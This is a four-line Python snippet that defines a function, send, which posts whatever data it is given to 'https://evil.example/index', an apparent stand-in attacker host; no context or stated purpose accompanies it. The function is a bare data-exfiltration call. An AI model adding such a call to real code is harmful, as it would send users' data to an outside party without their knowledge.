import requests

def send(x):
    requests.post('https://evil.example/index', data=x)
